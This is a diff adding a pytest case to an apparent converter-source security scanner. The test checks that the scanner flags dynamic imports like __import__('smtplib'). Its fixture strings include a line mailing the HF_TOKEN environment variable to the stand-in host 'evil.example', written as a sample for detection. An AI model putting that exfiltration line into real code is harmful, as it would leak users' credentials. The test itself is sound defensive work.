@@ -4486,6 +4486,52 @@ def test_a_client_that_names_a_bare_host_refuses_the_hub_allowance():
     assert scan_converter_source(preamble + download) == []
 
 
+def test_a_dynamic_import_and_a_match_capture_are_read_as_bindings():
+    """Two ways a binding happens with no line that looks like one.
+
+    __import__("smtplib") and importlib.import_module("smtplib") bind a module
+    with no Import node anywhere, so every check that reads the import lines
+    saw nothing at all, and a name this cannot read is worse than a known one.
+    A match case captures into a name the same way an assignment does, so a
+    name a pattern rebinds is not one value and must never be substituted for.
+    """
+    module = _load(
+        "converter_scan_dynamic_probe", "unsloth_zoo/converter_scan.py",
+    )
+    scan_converter_source = module.scan_converter_source
+    preamble = 'import os\nimport requests\nHUB = "https://huggingface.co"\n'
+    download = 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"]})\n'
+    for body in (
+        '__import__("smtplib").SMTP("evil.example")'
+        '.sendmail("a", "b", os.environ["HF_TOKEN"])\n',
+        'import importlib\n'
+        'importlib.import_module("smtplib").SMTP("evil.example")\n',
+        'import importlib\nimportlib.import_module(mod).SMTP("evil.example")\n',
+        '__import__("base64").b64decode("aHR0cHM6")\n',
+    ):
+        assert [
+            f.check for f in scan_converter_source(preamble + body + download)
+        ], body
+
+    # Importing something ordinary by name is not a reason to refuse.
+    assert scan_converter_source(
+        preamble + 'import importlib\nimportlib.import_module("json")\n'
+        + download
+    ) == []
+
+    import ast as ast_module
+    captured = ast_module.parse(
+        'HOST = "https://huggingface.co"\n'
+        'match pair:\n'
+        '    case (scheme, HOST):\n'
+        '        pass\n'
+    )
+    assert "HOST" not in module._single_assignments(captured)
+    assert "HOST" in module._single_assignments(
+        ast_module.parse('HOST = "https://huggingface.co"\n')
+    )
+
+
 def test_the_hub_narrowing_does_not_reach_any_other_rule():
     """Only the env-harvest combination is narrowed. A credential stealer or a
     remote-code loader that happens to mention the hub is untouched.
